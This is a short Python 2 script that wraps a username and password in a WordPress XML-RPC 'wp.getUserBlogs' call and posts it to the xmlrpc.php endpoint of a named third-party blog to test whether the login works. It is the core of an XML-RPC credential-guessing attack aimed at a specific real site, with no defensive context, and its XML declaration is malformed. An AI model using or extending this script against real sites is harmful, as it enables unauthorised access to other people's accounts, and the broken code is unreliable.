import requests

TARGET_URL = 'https://parahumans.wordpress.com/xmlrpc.php'

XML = '''
<?xml version "1.0" encoding="iso-8859-1"?>
<methodCall>
<methodName>wp.getUserBlogs</methodName>
<params>
  <param>
    <value>
      <string>{username}</string>
    </value>
  </param>
  <param>
    <value>
      <string>{password}</string>
    </value>
  </param>
 </params>
 </methodCall>

 '''

def wrap_cred_in_xml(username ='', password = ''):
	return XML.format(username = username, password = password)


def main():
	payload = wrap_cred_in_xml(username='testuser',password = 'qwerty')
	response = requests.post(TARGET_URL,payload)
	print response.text
	


if __name__ == '__main__':
	main()
